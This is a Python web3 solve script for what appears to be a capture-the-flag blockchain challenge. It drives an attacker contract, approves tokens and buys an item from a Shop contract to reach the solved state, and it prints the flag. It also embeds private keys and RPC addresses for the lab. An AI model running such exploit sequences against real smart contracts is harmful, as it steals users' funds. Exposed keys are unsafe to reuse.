from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from Crypto.Util.number import bytes_to_long

x = {
    "PrivateKey": "0xdc01c4b83349bd60ef37ccb0a191e8a14c40984a8e646214938b3308d82ab8ff",
    "Address": "0x0a107Cda0C45B7004E0Dc22Db9E261ABA6668432",
    "TargetAddress": "0x894CEFb5170871144C8Fa937D28634C8f7F837a9",
    "setupAddress": "0x717E79714f22c378F78Fcdb307c5ED93F55f5f7B"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

#Attack Contract address
Target2Contract = "0x2C55A80eB745e5b392b1D2e2d816f5839436e442"
#SilverCoin address
Target3Contract = "0xCc3a130d38849f67985A3E03eE98754B1Dd5aC67"

url = 'http://157.245.39.76:31736/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(block_number)

#print(block)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.7.0")


# Check if the block exists
if block is not None:
    # Access block information
    block_hash = block['hash']
    block_timestamp = block['timestamp']
    block_transactions = block['transactions']

    print(f"Block Number: {block_number}")
    print(f"Block Hash: {block_hash}")
    print(f"Block Timestamp: {block_timestamp}")
    print(f"Block Transactions: {block_transactions}")

    # Retrieve and print transaction details for each transaction in the block
    # Log -> Address
    for tx_hash in block_transactions:
        tx = w3.eth.get_transaction_receipt(tx_hash)
        if tx is not None:
            print(tx)

else:
    print(f"Block {block_number} not found.")

#exit(0)

'''
construct_txn = contract_instance3.functions.transfer(Address, 26_000_000).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
'''

#Contract2 should not be neccessary, can merge to SilverCoin attack
compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Contract.sol:Contract']['abi']

contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)

contract_instance2.functions.attack2().transact()
print(contract_instance2.functions.balanceOf(Address).call())
#print(contract_instance2.functions.balanceOf(TargetContract).call())
#print(contract_instance2.functions.balanceOf(SetupContract).call())

compiled = compile_files(["SilverCoin.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['SilverCoin.sol:SilverCoin']['abi']

contract_instance3 = w3.eth.contract(address=Target3Contract, abi=abi)

#contract_instance3.functions.approve(TargetContract, 28_000_000).transact()  #.transact() will cause address(0) in SilverCoin..., have to use build_transaction
#contract_instance3.functions.transfer(Address, 26_000_000).transact()

construct_txn = contract_instance3.functions.approve(TargetContract, 26_000_000).build_transaction(
#construct_txn = contract_instance3.functions.transfer(Address, 26_000_000).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

number = contract_instance3.functions.balanceOf(Address).call()
print(f'Balance of {Address}: {number}.')
number = contract_instance3.functions.balanceOf(SetupContract).call()
print(f'Balance of {SetupContract}: {number}.')
number = contract_instance3.functions.allowance(Address, Address).call()
print(f'allowance[{Address}][{TargetContract}] = {number}')

#exit(0)


compiled = compile_files(["Shop.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Shop.sol:Shop']['abi']

contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

#construct_txn = contract_instance2.functions.buyItem(2).transact()
construct_txn = contract_instance2.functions.buyItem(2).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved(account_address).call()
#number = contract_instance.functions.isSolved(Target2Contract).call()

print(f'The current number stored is: { number } ')
#HTB{und32f10w_70_937_7h3_k3y}


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
